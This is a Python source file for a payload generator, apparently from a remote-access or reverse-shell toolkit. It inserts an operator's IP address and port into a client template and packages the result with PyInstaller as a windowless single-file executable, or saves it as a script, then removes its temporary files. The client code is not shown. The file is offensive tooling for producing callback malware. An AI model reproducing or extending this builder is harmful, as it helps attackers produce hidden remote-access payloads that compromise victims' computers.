import platform
import shutil
import threading
import time
import PyInstaller.__main__

from common.output import *


class GENERATOR:

    def __init__(self, parser):
        self.output_path = self.append_payload_extension(parser.output, parser.source)
        self.base_directory = os.path.dirname(__file__)
        self.temp_dir = ""
        self.script_code = self.compile_script(parser.address, parser.port)

        if parser.source:
            self.generate_script()
        else:
            self.generate_executable()
            self.clean()

    def append_payload_extension(self, out, source):
        filename = ""
        if source:
            if not out.endswith(".py"):
                filename = (out + ".py")
            else:
                filename = out
        else:
            if platform.system() == "Windows":
                if not out.endswith(".exe"):
                    filename = (out + ".exe")
                else:
                    filename = out
            elif platform.system() == "Linux":
                filename = (out)
            else:
                print_red("Unrecognized Platform")
        return filename

    def compile_script(self, ip, port):
        print_blue("Compiling modules ... ")
        fl = open(os.path.join(self.base_directory, 'raw_client.py'))
        code = fl.read()
        fl.close()
        code = code.replace('CONSTIP = ""', f'CONSTIP = "{ip}"')
        code = code.replace('CONSTPT = None', f'CONSTPT = {port}')
        print_green("Script plain text generated successfully!")
        return code

    def generate_temp_dir(self):
        print_blue("Generating temp folder")
        temporary_directory = os.path.join(self.base_directory, 'tmp')
        if not os.path.isdir(temporary_directory):
            os.mkdir(temporary_directory)
        fname = os.path.join(temporary_directory, 'temp.py')
        return temporary_directory, fname, 'temp.py'

    def generate_script(self):
        fl = open(self.output_path, 'w')
        fl.write(self.script_code)
        fl.close()
        print_green("Generated script payload. " + make_cyan("File: " + self.output_path))


    def generate_executable(self):
        self.temp_dir = self.generate_temp_dir()
        fl = open(self.temp_dir[1], 'w')
        fl.write(self.script_code)
        fl.close()
        counter = 1

        t = threading.Thread(target=PyInstaller.__main__.run, args=([
            '--name=%s' % os.path.basename(self.output_path),
            '--onefile',
            '--windowed',
            '--log-level=ERROR',
            '--distpath=%s' % os.path.dirname(self.output_path),
            '--workpath=%s' % self.temp_dir[0],
            os.path.join(self.temp_dir[0], self.temp_dir[2])
        ],), )
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write( "\r" + make_yellow("Elapsed Time: %is" % counter))
            time.sleep(1)
            counter += 1
        sys.stdout.write("\n")
        print_green("Generated executable payload." + make_cyan("File: " + self.output_path))


    def clean(self):
        print_blue("Cleaning files and temporary codes")
        shutil.rmtree(self.temp_dir[0])
